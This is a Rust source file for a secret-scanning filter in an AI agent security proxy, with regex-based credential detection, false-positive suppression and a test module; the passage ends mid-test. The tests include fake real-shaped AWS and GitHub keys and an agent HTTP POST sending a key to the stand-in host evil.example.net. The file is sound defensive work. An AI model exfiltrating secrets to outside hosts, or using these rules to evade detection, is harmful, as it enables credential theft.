// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Secret scanning filter with 1600+ regex patterns.

use crate::filters::{FilterPhase, SecurityFilter};
use crate::types::{FilterResult, Severity, ToolCallContext, ToolCallType};
use regex::{Regex, RegexSet, RegexSetBuilder};
use serde::Deserialize;
use std::sync::OnceLock;

/// Configuration for a single secret scanning pattern.
#[derive(Debug, Clone, Deserialize)]
pub struct SecretPattern {
    pub id: String,
    pub regex: String,
    pub score: f64,
    pub severity: String,
    pub message: String,
}

/// Per-pattern metadata stored parallel to compiled matchers.
struct PatternMeta {
    id: String,
    score: f64,
    severity: Severity,
    message: String,
}

/// Fallback matcher used if building the combined `RegexSet` fails.
struct CompiledPattern {
    regex: Regex,
    meta: PatternMeta,
}

enum Matcher {
    Set {
        set: RegexSet,
        metadata: Vec<PatternMeta>,
        /// Regex source per pattern (index-aligned with `metadata`), kept so a
        /// matched pattern can be compiled on demand to locate its match span.
        sources: Vec<String>,
        /// Lazily-compiled individual matcher per pattern. Only patterns that
        /// actually fire (rare) are ever compiled, preserving the fast
        /// `RegexSet`-only startup. `None` means the source failed to compile
        /// individually (treated fail-safe: the match is kept, not suppressed).
        lazy: Vec<OnceLock<Option<Regex>>>,
    },
    Individual(Vec<CompiledPattern>),
}

/// Filter that scans arguments and content for secrets using regex patterns.
///
/// Runs in Phase 2 (Pattern) since regex evaluation is heavier than simple
/// string matching. Scans JSON arguments, shell commands, and URLs for
/// patterns matching known secret formats (API keys, tokens, private keys, etc.).
///
/// Uses `regex::RegexSet` so all patterns are compiled into a single NFA —
/// faster startup than N individual `Regex::new()` calls and O(input) evaluation
/// regardless of pattern count.
pub struct SecretScanFilter {
    matcher: Matcher,
}

impl SecretScanFilter {
    pub fn new(patterns: Vec<SecretPattern>) -> Self {
        let regex_strings: Vec<String> = patterns.iter().map(|p| p.regex.clone()).collect();
        let metadata: Vec<PatternMeta> = patterns
            .iter()
            .map(|p| PatternMeta {
                id: p.id.clone(),
                score: p.score,
                severity: parse_severity(&p.severity),
                message: p.message.clone(),
            })
            .collect();

        let matcher = match RegexSetBuilder::new(&regex_strings)
            .size_limit(64 * (1 << 20))
            .dfa_size_limit(64 * (1 << 20))
            .build()
        {
            Ok(set) => {
                let lazy = regex_strings.iter().map(|_| OnceLock::new()).collect();
                Matcher::Set {
                    set,
                    metadata,
                    sources: regex_strings,
                    lazy,
                }
            }
            Err(set_err) => {
                tracing::warn!(
                    error = %set_err,
                    "failed to build combined secret-scan RegexSet; falling back to per-pattern matching"
                );
                Matcher::Individual(compile_individual_patterns(patterns))
            }
        };

        Self { matcher }
    }

    pub fn pattern_count(&self) -> usize {
        match &self.matcher {
            Matcher::Set { set, .. } => set.len(),
            Matcher::Individual(patterns) => patterns.len(),
        }
    }
}

#[async_trait::async_trait]
impl SecurityFilter for SecretScanFilter {
    fn name(&self) -> &str {
        "secret-scan"
    }

    fn phase(&self) -> FilterPhase {
        FilterPhase::Pattern
    }

    async fn evaluate(&self, ctx: &ToolCallContext) -> crate::error::Result<FilterResult> {
        let text = extract_scannable_text(ctx);
        if text.is_empty() {
            return Ok(FilterResult::no_match("secret-scan"));
        }

        // FP §5.11: reads of minified bundles / `node_modules` content are a
        // low-signal context where the generic keyword-assignment heuristics
        // (`generic-*`) over-match on minified variable names and config
        // defaults. In that context those generic matches are DOWN-WEIGHTED
        // (not suppressed) so they no longer QUEUE on their own; specific
        // vendor/format patterns (AWS, GitHub, Stripe, base64-encoded keys, …)
        // keep full weight, so a real credential embedded in a package still
        // fires.
        let low_signal = ctx.path().map(is_low_signal_asset_path).unwrap_or(false);

        // For each matched pattern with a real (non-benign) match, take its
        // effective score (down-weighted for generic patterns in a low-signal
        // asset) and keep the highest-scoring one.
        let best: Option<(&PatternMeta, f64, Severity)> = match &self.matcher {
            Matcher::Set {
                set,
                metadata,
                sources,
                lazy,
            } => {
                let matched_indices = set.matches(&text);
                if !matched_indices.matched_any() {
                    return Ok(FilterResult::no_match("secret-scan"));
                }
                matched_indices
                    .iter()
                    .filter_map(|i| {
                        let meta = &metadata[i];
                        // A pattern whose every match is a provably-benign shape
                        // is suppressed; a compile failure fails safe (kept).
                        let real = match lazy[i].get_or_init(|| Regex::new(&sources[i]).ok()) {
                            Some(re) => pattern_has_real_match(re, &text),
                            None => true,
                        };
                        if !real {
                            return None;
                        }
                        let (score, severity) = effective_score(meta, low_signal);
                        Some((meta, score, severity))
                    })
                    .max_by(|a, b| a.1.partial_cmp(&b.1).unwrap_or(std::cmp::Ordering::Equal))
            }
            Matcher::Individual(patterns) => patterns
                .iter()
                .filter(|pattern| pattern_has_real_match(&pattern.regex, &text))
                .map(|pattern| {
                    let (score, severity) = effective_score(&pattern.meta, low_signal);
                    (&pattern.meta, score, severity)
                })
                .max_by(|a, b| a.1.partial_cmp(&b.1).unwrap_or(std::cmp::Ordering::Equal)),
        };

        match best {
            Some((m, score, severity)) => Ok(FilterResult::matched(
                "secret-scan",
                &m.id,
                score,
                severity,
                &m.message,
            )),
            None => Ok(FilterResult::no_match("secret-scan")),
        }
    }
}

fn compile_individual_patterns(patterns: Vec<SecretPattern>) -> Vec<CompiledPattern> {
    patterns
        .into_iter()
        .filter_map(|p| match Regex::new(&p.regex) {
            Ok(regex) => Some(CompiledPattern {
                regex,
                meta: PatternMeta {
                    id: p.id,
                    score: p.score,
                    severity: parse_severity(&p.severity),
                    message: p.message,
                },
            }),
            Err(e) => {
                tracing::warn!(pattern = %p.id, error = %e, "failed to compile secret pattern");
                None
            }
        })
        .collect()
}

/// Extract text content from the context for scanning.
///
/// The arguments bag is scanned with the ATTRIBUTION argv stripped first.
/// Supervisor events carry the calling process's full command line
/// (`process_args`) and its parent's (`parent_process_args`) so the operator
/// can see who made a call — but that argv already had its secret scan at its
/// own `ProcessSpawn`/`ShellExec`, where it is the call's content. Left in,
/// a secret-shaped token in one command line re-fires on EVERY later syscall
/// the process makes: one measured session had a +3.5 rider on a session-bus
/// `connect(2)` — nothing secret crossing the socket — which containment's
/// +2.0 then pushed over the queue threshold. Price the argv once, at the
/// spawn that is made of it.
fn extract_scannable_text(ctx: &ToolCallContext) -> String {
    let args_text = match &ctx.arguments {
        serde_json::Value::Object(map) => {
            let mut scrubbed = map.clone();
            scrubbed.remove("process_args");
            scrubbed.remove("parent_process_args");
            serde_json::Value::Object(scrubbed).to_string()
        }
        other => other.to_string(),
    };

    match &ctx.call_type {
        ToolCallType::ShellExec { command, args }
        | ToolCallType::ProcessSpawn { command, args } => {
            format!("{} {} {}", args_text, command, args.join(" "))
        }
        ToolCallType::HttpRequest { url, .. } => {
            format!("{} {}", args_text, url)
        }
        ToolCallType::NetConnect { address, .. } => {
            format!("{} {}", args_text, address)
        }
        ToolCallType::DnsQuery { domain, .. } => {
            format!("{} {}", args_text, domain)
        }
        _ => args_text,
    }
}

fn parse_severity(s: &str) -> Severity {
    match s.to_lowercase().as_str() {
        "critical" => Severity::Critical,
        "error" => Severity::Error,
        "warning" => Severity::Warning,
        _ => Severity::Notice,
    }
}

// ---------------------------------------------------------------------------
// Benign-shape suppression (FP research §5.11)
//
// CURATION POLICY: these carve-outs reduce false positives on provably-benign
// token shapes that the 1,620-pattern corpus would otherwise flag (git SHAs,
// lockfile integrity hashes, JWTs in fixtures, UUIDs, documented example/test
// keys). They are security-relevant: every arm is paired with a guard test in
// this module proving a *real* secret in the same context still fires. The
// suppression is shape-based and conservative — it never widens detection, only
// withholds a match whose value cannot be a live credential in that form. When
// the matched pattern's individual regex fails to compile, the match is KEPT
// (fail-safe), never suppressed.
// ---------------------------------------------------------------------------

/// Score a low-signal generic match is down-weighted to (FP §5.11). Below the
/// 3.0 QUEUE threshold so it no longer escalates on its own, but non-zero and
/// `matched = true` so it is still recorded (down-weight, not suppress).
const LOW_SIGNAL_GENERIC_SCORE: f64 = 1.0;

/// Effective `(score, severity)` for a matched pattern. In a low-signal asset
/// context (minified bundle / `node_modules`), generic keyword-heuristic
/// patterns are down-weighted; everything else keeps its configured score.
fn effective_score(meta: &PatternMeta, low_signal: bool) -> (f64, Severity) {
    if low_signal && is_generic_heuristic_pattern(&meta.id) {
        (LOW_SIGNAL_GENERIC_SCORE, Severity::Notice)
    } else {
        (meta.score, meta.severity)
    }
}

/// True for the `generic-*` / `*-generic` keyword-assignment heuristic family
/// (e.g. `generic-api-key-assignment`, `generic-secret-assignment`). These
/// match on the *shape* of an assignment rather than a vendor-specific key
/// format, so they are the ones that over-match minified code. Specific
/// vendor/format patterns (`aws-*`, `github-*`, `stripe-*`, `base64-aws-*`, …)
/// are NOT in this set and are never down-weighted.
fn is_generic_heuristic_pattern(id: &str) -> bool {
    id.starts_with("generic-") || id.ends_with("-generic")
}

/// True when the scanned path is a low-signal asset where the generic secret
/// heuristics produce mostly noise: anything under `node_modules`, or a
/// minified bundle / source map by extension.
fn is_low_signal_asset_path(path: &str) -> bool {
    let p = path.to_ascii_lowercase();
    p.contains("/node_modules/")
        || p.starts_with("node_modules/")
        || p.ends_with(".min.js")
        || p.ends_with(".min.mjs")
        || p.ends_with(".min.css")
        || p.ends_with(".map")
}

/// Returns true if `re` has at least one match in `text` that is NOT a
/// provably-benign shape. A pattern whose every match is benign is suppressed.
fn pattern_has_real_match(re: &Regex, text: &str) -> bool {
    re.find_iter(text)
        .any(|m| !is_benign_secret_value(text, m.start(), m.end()))
}

/// The maximal whitespace/quote-delimited token in `text` spanning `[start,
/// end)`. A secret pattern often matches only part of a benign token (e.g. one
/// base64url segment of a JWT), so shape checks run against the whole token.
fn surrounding_token(text: &str, start: usize, end: usize) -> &str {
    let is_bound = |c: char| c.is_whitespace() || c == '"' || c == '\'';
    let token_start = text[..start]
        .char_indices()
        .rev()
        .find(|(_, c)| is_bound(*c))
        .map(|(i, c)| i + c.len_utf8())
        .unwrap_or(0);
    let token_end = text[end..]
        .char_indices()
        .find(|(_, c)| is_bound(*c))
        .map(|(i, _)| end + i)
        .unwrap_or(text.len());
    &text[token_start..token_end]
}

/// Documented test placeholders that appear in docs, READMEs, and test
/// fixtures. Only unambiguous `_test_`-style markers — `live`/`prod` markers
/// are deliberately excluded so genuine keys still fire.
///
/// NOTE: AWS's documented example key (`AKIAIOSFODNN7EXAMPLE`) is intentionally
/// NOT carved out here. Unlike the Stripe-style `_test_` prefixes it is a
/// real-format access key id (valid `AKIA` prefix + charset), and is used
/// pervasively as a stand-in secret in fixtures/tests; flagging it is the
/// conservative choice. Reading AWS docs that contain it is an accepted minor
/// residual.
const TEST_PLACEHOLDER_MARKERS: &[&str] = &[
    "sk-test-",
    "sk_test_",
    "pk_test_",
    "rk_test_",
    "whsec_test_",
];

/// Lockfile integrity (npm/yarn `integrity: "sha512-<base64>"`) prefixes.
const INTEGRITY_PREFIXES: &[&str] = &["sha512-", "sha384-", "sha256-", "sha1-"];

fn bare_sha_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"^(?:[0-9a-f]{40}|[0-9a-f]{64})$").unwrap())
}

fn jwt_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$").unwrap())
}

fn uuid_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")
            .unwrap()
    })
}

/// True when the bytes immediately before `pos` (skipping quotes/spaces) end in
/// `=` or `:` — i.e. the value is being assigned to a key, which makes a
/// bare-looking hash far more likely to be a real secret than a git SHA.
fn is_assignment_context(text: &str, pos: usize) -> bool {
    let prefix = text[..pos].trim_end_matches([' ', '\t', '"', '\'']);
    prefix.ends_with('=') || prefix.ends_with(':')
}

/// Byte offset where the surrounding whitespace/quote-delimited token begins.
fn token_start_offset(text: &str, start: usize) -> usize {
    let is_bound = |c: char| c.is_whitespace() || c == '"' || c == '\'';
    text[..start]
        .char_indices()
        .rev()
        .find(|(_, c)| is_bound(*c))
        .map(|(i, c)| i + c.len_utf8())
        .unwrap_or(0)
}

/// True when the secret-pattern match spanning `[start, end)` in `text` is a
/// provably-benign shape that must not be treated as a live secret. Checks run
/// against the whole surrounding token, since a pattern often matches only part
/// of a benign value. See the curation-policy note above.
fn is_benign_secret_value(text: &str, start: usize, end: usize) -> bool {
    let token = surrounding_token(text, start, end);

    // 1. Documented example / test placeholders (sk-test-, AWS example key, …).
    if TEST_PLACEHOLDER_MARKERS.iter().any(|m| token.contains(m)) {
        return true;
    }
    // 2. Lockfile integrity hash — `integrity: "sha512-<base64>"`. The token
    //    carries (or the value is immediately preceded by) the `shaNNN-` prefix.
    if INTEGRITY_PREFIXES.iter().any(|p| token.starts_with(p))
        || INTEGRITY_PREFIXES
            .iter()
            .any(|p| text[..start].ends_with(p))
    {
        return true;
    }
    // 3. RFC-4122 UUID — never a credential.
    if uuid_regex().is_match(token) {
        return true;
    }
    // 4. JWT structure (`eyJ` header + base64url segments). Ubiquitous in
    //    fixtures and docs; a JWT carrying an embedded credential is out of
    //    scope for shape-based scanning (documented tradeoff).
    if jwt_regex().is_match(token) {
        return true;
    }
    // 5. Bare git/SHA hex digest (40 = SHA-1, 64 = SHA-256) NOT assigned to a
    //    key. `git show <sha>:file`, file checksums, etc. The assignment check
    //    looks before the *token*, so `key = "<40hex>"` still fires.
    if bare_sha_regex().is_match(token)
        && !is_assignment_context(text, token_start_offset(text, start))
    {
        return true;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::ToolCallType;
    use serde::Deserialize;
    use std::fs;
    use std::path::PathBuf;
    use uuid::Uuid;

    #[derive(Deserialize)]
    struct SecretPatternsFile {
        patterns: Vec<SecretPattern>,
    }

    fn make_ctx_with_args(call_type: ToolCallType, args: serde_json::Value) -> ToolCallContext {
        let mut ctx = ToolCallContext::new("test", call_type, Uuid::new_v4());
        ctx.arguments = args;
        ctx
    }

    /// The 2026-08-21 rider: a secret-shaped token in the ATTRIBUTION argv
    /// must not score a later, unrelated syscall from that process — it was
    /// priced at its own spawn. The same token as the CALL's own content
    /// (spawn argv, file path bag) must still fire.
    #[tokio::test]
    async fn attribution_argv_never_scores_but_call_content_still_does() {
        let filter = SecretScanFilter::new(load_real_patterns());
        let secret =
            "AKIA0000000000EXAMPL0 aws_secret_access_key=abcdEFGH1234abcdEFGH1234abcdEFGH1234abcd";

        // A bus connect whose arguments carry the connecting process's argv,
        // exactly as `supervisor_event_arguments` builds them.
        let connect = make_ctx_with_args(
            ToolCallType::NetConnect {
                address: "unix:/run/user/1000/bus".into(),
                port: 0,
            },
            serde_json::json!({
                "pid": 4242,
                "process": "node",
                "process_args": ["node", "-e", secret],
                "parent_process": "bash",
                "parent_process_args": ["bash", "-c", secret],
                "address": "unix:/run/user/1000/bus",
                "port": 0,
            }),
        );
        let result = filter.evaluate(&connect).await.unwrap();
        assert!(
            !result.matched,
            "attribution argv must not re-score a connect: {:?}",
            result.message
        );

        // The same token where the argv IS the call: still fires.
        let spawn = make_ctx(ToolCallType::ProcessSpawn {
            command: "/usr/bin/node".into(),
            args: vec!["node".into(), "-e".into(), secret.into()],
        });
        let result = filter.evaluate(&spawn).await.unwrap();
        assert!(result.matched, "the spawn's own argv must still be scanned");

        // And a non-argv secret in the bag (e.g. written content) on a
        // non-spawn call: still fires — only the two attribution keys are
        // scrubbed, nothing else.
        let write = make_ctx_with_args(
            ToolCallType::FileWrite {
                path: "/tmp/out".into(),
                content_hash: String::new(),
            },
            serde_json::json!({ "content_preview": secret }),
        );
        let result = filter.evaluate(&write).await.unwrap();
        assert!(
            result.matched,
            "non-attribution bag content must still be scanned"
        );
    }

    fn make_ctx(call_type: ToolCallType) -> ToolCallContext {
        ToolCallContext::new("test", call_type, Uuid::new_v4())
    }

    /// Load the real shipped pattern corpus (`config/filters/secrets.toml`).
    /// CWD for a crate test is the crate root, so the repo config is `../../`.
    fn load_real_patterns() -> Vec<SecretPattern> {
        let path = PathBuf::from("../../config/filters/secrets.toml");
        let text = fs::read_to_string(&path).expect("read secrets.toml");
        let file: SecretPatternsFile = toml::from_str(&text).expect("parse secrets.toml");
        file.patterns
    }

    /// Representative BENIGN high-entropy tokens that a real POST body / shell
    /// arg / file content would legitimately carry. None is a live credential.
    fn benign_high_entropy_corpus() -> Vec<(&'static str, &'static str)> {
        vec![
            ("nanoid", "V1StGXR8_Z5jdHi6B-myT"),
            ("nanoid-long", "FraBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789ab"),
            ("prefixed-user-id", "user_2abc3def4ghi5jkl6mno7pqrstuv"),
            ("prefixed-session", "sess_9c1e2b3d4f5a6b7c8d9e0f1a2b3c4d5e"),
            ("prefixed-req-fn", "req_Xy3fnKq8Wv2mNpQrStUvWxYz0123456789"),
            ("build-ref-fn", "build-fn_2024_9c1e2b3d4f5a6b7c8d9e0f1a2b"),
            ("opaque-id-fn", "ab_fn_2024_build_hash_9c1e2b3d4f5a6b7c8d9e"),
            ("git-sha", "9c1e2b3d4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c"),
            ("sha256-hex", "9c1e2b3d4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c"),
            ("md5-hex", "9c1e2b3d4f5a6b7c8d9e0f1a2b3c4d5e"),
            ("uuid", "550e8400-e29b-41d4-a716-446655440000"),
            ("base64-blob", "SGVsbG9Xb3JsZFRoaXNJc0FCYXNlNjRQYXlsb2FkVGhhdA=="),
            ("jwt", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"),
            ("docker-digest", "sha256:9c1e2b3d4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c"),
            ("ac-hex-token", "ACa1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"),
            ("kl-base58", "KLm3n4p5q6r7s8t9u2v3w4x5y6z7A8B9C2D3E4F5G6H7J8K9L2"),
            ("re-token", "re_abcdefghij0123456789klmnop"),
            ("re-long-noUnderscore", "re_abcdefghij0123456789klmnopqrstuvwxyz"),
            ("re-render-key", "re_render_cache_key_9c1e2b3d4f5a6b7c8d9e"),
            ("sk-token", "sk_abcdefghij0123456789klmnopqrstuv"),
            ("pk-token", "pk_test_abcdefghij0123456789klmnop"),
            ("fn-long-44", "fn2024buildhash9c1e2b3d4f5a6b7c8d9e0f1a2b3c4d"),
            ("session-hex", "session=9c1e2b3d4f5a6b7c8d9e0f1a2b3c4d5e"),
        ]
    }

    /// DISCOVERY HARNESS (run: `cargo test -p grith-proxy discover_body_fp
    /// -- --ignored --nocapture`). Prints (a) every real pattern whose regex
    /// matches a benign token, and (b) which benign tokens the FULL filter
    /// (post-suppression) actually flags in a POST-body context. Not an
    /// assertion — a triage tool for the S1 pattern-anchoring work.
    #[tokio::test]
    #[ignore]
    async fn discover_body_fp_patterns() {
        let patterns = load_real_patterns();
        let corpus = benign_high_entropy_corpus();

        // (a) raw per-pattern matches (pre-suppression) — enumerates every
        //     FP-prone pattern, not just the winner.
        let mut hits: Vec<(f64, String, String, String)> = Vec::new();
        for p in &patterns {
            let re = match Regex::new(&p.regex) {
                Ok(r) => r,
                Err(_) => continue,
            };
            for (name, tok) in &corpus {
                let body = format!("{{\"k\":\"{tok}\"}}");
                if re.is_match(&body) {
                    hits.push((p.score, p.id.clone(), p.regex.clone(), (*name).to_string()));
                }
            }
        }
        hits.sort_by(|a, b| b.0.partial_cmp(&a.0).unwrap());
        eprintln!("\n=== (a) patterns matching a benign token (pre-suppression) ===");
        for (score, id, regex, tok) in &hits {
            eprintln!("  {score:>4}  {id:<32}  on={tok:<18}  /{regex}/");
        }
        eprintln!("  TOTAL raw-FP pattern hits: {}", hits.len());

        // (b) full filter (post-suppression) on a POST body — the true FP set.
        let filter = SecretScanFilter::new(patterns.clone());
        eprintln!("\n=== (b) full-filter QUEUE on benign POST body (post-suppression) ===");
        let mut fp_count = 0;
        for (name, tok) in &corpus {
            let ctx = make_ctx_with_args(
                ToolCallType::HttpRequest {
                    method: "POST".into(),
                    url: "https://api.example.com/x".into(),
                },
                serde_json::json!({
                    "method": "POST", "url": "https://api.example.com/x",
                    "body": format!("{{\"k\":\"{tok}\"}}"),
                }),
            );
            let r = filter.evaluate(&ctx).await.unwrap();
            if r.matched && r.score >= 3.0 {
                fp_count += 1;
                eprintln!("  FP {name:<18} score={} rule={}", r.score, r.rule_id);
            }
        }
        eprintln!(
            "  TOTAL benign bodies that QUEUE: {fp_count}/{}\n",
            corpus.len()
        );

        // (c) RECALL: real fauna/resend keys in env-style AND JSON-style — which
        //     pattern (if any) catches each? Shows what removal/anchoring keeps.
        let recall: Vec<(&str, &str)> = vec![
            (
                "fauna-env",
                "FAUNA_SECRET=fnAbCdEfGhIjKlMnOpQrStUvWxYz01234567890123",
            ),
            (
                "fauna-json",
                "{\"faunaSecret\":\"fnAbCdEfGhIjKlMnOpQrStUvWxYz01234567890123\"}",
            ),
            ("fauna-raw", "fnAbCdEfGhIjKlMnOpQrStUvWxYz01234567890123"),
            (
                "resend-env",
                "RESEND_API_KEY=re_AbCdEfGhIjKlMnOpQrStUvWx12345678",
            ),
            (
                "resend-json",
                "{\"resendApiKey\":\"re_AbCdEfGhIjKlMnOpQrStUvWx12345678\"}",
            ),
            ("resend-raw", "re_AbCdEfGhIjKlMnOpQrStUvWx12345678"),
        ];
        eprintln!("=== (c) recall on real keys (env vs json vs raw) ===");
        for (name, text) in &recall {
            let ctx = make_ctx_with_args(
                ToolCallType::HttpRequest {
                    method: "POST".into(),
                    url: "https://api.example.com/x".into(),
                },
                serde_json::json!({ "method": "POST", "url": "https://api.example.com/x", "body": text }),
            );
            let r = filter.evaluate(&ctx).await.unwrap();
            eprintln!(
                "  {name:<14} matched={} score={} rule={}",
                r.matched, r.score, r.rule_id
            );
        }
        eprintln!();
    }

    /// Build a proxy ctx representing a Path-1 `http_request` POST whose body is
    /// `text` — the C1 scanning surface.
    fn body_ctx(text: &str) -> ToolCallContext {
        make_ctx_with_args(
            ToolCallType::HttpRequest {
                method: "POST".into(),
                url: "https://api.example.com/x".into(),
            },
            serde_json::json!({
                "method": "POST", "url": "https://api.example.com/x", "body": text,
            }),
        )
    }

    /// S1 (2026-08-07): after value-boundary anchoring `fauna-server-key` /
    /// `resend-api-key` and removing the looser `fauna-secret-bare` /
    /// `resend-api-key-bare` duplicates, a vendor prefix embedded inside a
    /// compound benign token no longer QUEUEs. Pins the FP fix against the REAL
    /// shipped corpus, so re-adding an unanchored bare pattern re-breaks this.
    #[tokio::test]
    async fn s1_embedded_prefix_tokens_no_longer_fp() {
        let filter = SecretScanFilter::new(load_real_patterns());
        for tok in [
            "build-fn_2024_9c1e2b3d4f5a6b7c8d9e0f1a2b", // fauna `fn` after '-'
            "ab_fn_2024_build_hash_9c1e2b3d4f5a6b7c8d9e", // fauna `fn` after '_'
            "req_Xy3fnKq8Wv2mNpQrStUvWxYz0123456789",   // fauna `fn` mid-token
            "re_render_cache_key_9c1e2b3d4f5a6b7c8d9e", // resend `re_` w/ underscores
            "re_abcdefghij0123456789klmnop",            // resend `re_` under real-key length
        ] {
            let r = filter.evaluate(&body_ctx(tok)).await.unwrap();
            assert!(
                r.score < 3.0,
                "benign '{tok}' must not QUEUE, got {} via {}",
                r.score,
                r.rule_id
            );
        }
    }

    /// S1 recall guard: the fix loses NO detection of a real fauna/resend key —
    /// env-style via the keyword-anchored siblings, and JSON/raw via the
    /// (still value-start-matching) anchored `fauna-server-key`/`resend-api-key`.
    #[tokio::test]
    async fn s1_real_fauna_resend_keys_still_detected() {
        let filter = SecretScanFilter::new(load_real_patterns());
        for text in [
            "FAUNA_SECRET=fnAbCdEfGhIjKlMnOpQrStUvWxYz01234567890123",
            "{\"faunaSecret\":\"fnAbCdEfGhIjKlMnOpQrStUvWxYz01234567890123\"}",
            "fnAbCdEfGhIjKlMnOpQrStUvWxYz01234567890123",
            "RESEND_API_KEY=re_AbCdEfGhIjKlMnOpQrStUvWx12345678",
            "{\"resendApiKey\":\"re_AbCdEfGhIjKlMnOpQrStUvWx12345678\"}",
            "re_AbCdEfGhIjKlMnOpQrStUvWx12345678",
        ] {
            let r = filter.evaluate(&body_ctx(text)).await.unwrap();
            assert!(
                r.matched && r.score >= 3.0,
                "real key '{text}' must still flag, got {} via {}",
                r.score,
                r.rule_id
            );
        }
    }

    fn test_patterns() -> Vec<SecretPattern> {
        vec![
            SecretPattern {
                id: "aws-access-key".into(),
                regex: "AKIA[0-9A-Z]{16}".into(),
                score: 5.0,
                severity: "critical".into(),
                message: "AWS access key ID detected".into(),
            },
            SecretPattern {
                id: "github-token".into(),
                regex: "gh[ps]_[A-Za-z0-9_]{36,}".into(),
                score: 5.0,
                severity: "critical".into(),
                message: "GitHub token detected".into(),
            },
            SecretPattern {
                id: "private-key-block".into(),
                regex: "-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----".into(),
                score: 5.0,
                severity: "critical".into(),
                message: "Private key block detected".into(),
            },
            SecretPattern {
                id: "generic-api-key".into(),
                regex: r#"(?i)(api[_\-]?key|apikey)\s*[=:]\s*['"]?[A-Za-z0-9]{20,}['"]?"#.into(),
                score: 3.0,
                severity: "warning".into(),
                message: "Potential API key detected".into(),
            },
        ]
    }

    fn load_real_secret_patterns() -> Vec<SecretPattern> {
        let path =
            PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../config/filters/secrets.toml");
        let raw = fs::read_to_string(path).expect("read real secret corpus");
        toml::from_str::<SecretPatternsFile>(&raw)
            .expect("parse real secret corpus")
            .patterns
    }

    #[tokio::test]
    async fn test_aws_key_detected() {
        let filter = SecretScanFilter::new(test_patterns());
        let ctx = make_ctx_with_args(
            ToolCallType::FileWrite {
                path: "/tmp/config".into(),
                content_hash: "abc".into(),
            },
            serde_json::json!({
                // A real-shaped key (NOT AWS's documented `AKIAIOSFODNN7EXAMPLE`,
                // which is now carved out as a placeholder).
                "content": "aws_access_key_id = AKIAQYLPMN5HZ3RT2WX4"
            }),
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "aws-access-key");
        assert_eq!(result.score, 5.0);
    }

    /// C1: a secret placed in the Path-1 `http_request` tool's `body` argument
    /// is scanned — because the body lands in `ctx.arguments` (== the tool call
    /// args), secret_scan catches it with no filter change. This is the built-in
    /// agent POSTing a secret.
    #[tokio::test]
    async fn test_secret_in_http_request_body_detected() {
        let filter = SecretScanFilter::new(test_patterns());
        let ctx = make_ctx_with_args(
            ToolCallType::HttpRequest {
                method: "POST".into(),
                url: "https://evil.example.net/collect".into(),
            },
            serde_json::json!({
                "method": "POST",
                "url": "https://evil.example.net/collect",
                "body": "{\"key\": \"AKIAQYLPMN5HZ3RT2WX4\"}"
            }),
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "aws-access-key");
    }

    #[tokio::test]
    async fn test_github_token_in_command() {
        let filter = SecretScanFilter::new(test_patterns());
        let ctx = make_ctx(ToolCallType::ShellExec {
            command: "curl".into(),
            args: vec![
                "-H".into(),
                "Authorization: token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn".into(),
                "https://api.github.com".into(),
            ],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "github-token");
    }

    #[tokio::test]
    async fn test_private_key_detected() {
        let filter = SecretScanFilter::new(test_patterns());
        let ctx = make_ctx_with_args(
            ToolCallType::FileWrite {
                path: "/tmp/key".into(),
                content_hash: "abc".into(),
            },
            serde_json::json!({
                "content": "-----BEGIN RSA PRIVATE KEY-----\nMIIE..."
            }),
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "private-key-block");
    }

    #[tokio::test]
    async fn test_generic_api_key_detected() {
        let filter = SecretScanFilter::new(test_patterns());
        let ctx = make_ctx_with_args(
            ToolCallType::FileWrite {
                path: "/tmp/config".into(),
                content_hash: "abc".into(),
            },
            serde_json::json!({
                "content": "api_key = ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            }),
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "generic-api-key");
        assert_eq!(result.score, 3.0);
    }

    #[tokio::test]
    async fn test_clean_content_passes() {
        let filter = SecretScanFilter::new(test_patterns());
        let ctx = make_ctx_with_args(
            ToolCallType::FileWrite {
                path: "/tmp/readme.md".into(),
                content_hash: "abc".into(),
            },
            serde_json::json!({
                "content": "Hello, world! This is a normal file."
            }),
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(!result.matched);
    }

    #[tokio::test]
    async fn test_invalid_regex_skipped() {
        let patterns = vec![SecretPattern {
            id: "bad-regex".into(),
            regex: "[invalid".into(),
            score: 5.0,
            severity: "critical".into(),
            message: "should not compile".into(),
        }];
        let filter = SecretScanFilter::new(patterns);
        assert_eq!(filter.pattern_count(), 0);
    }

    #[tokio::test]
    async fn test_mixed_valid_and_invalid_patterns_still_detect_valid_secret() {
        let patterns = vec![
            SecretPattern {
                id: "bad-regex".into(),
                regex: "[invalid".into(),
                score: 5.0,
                severity: "critical".into(),
                message: "should not compile".into(),
            },
            SecretPattern {
                id: "github-token".into(),
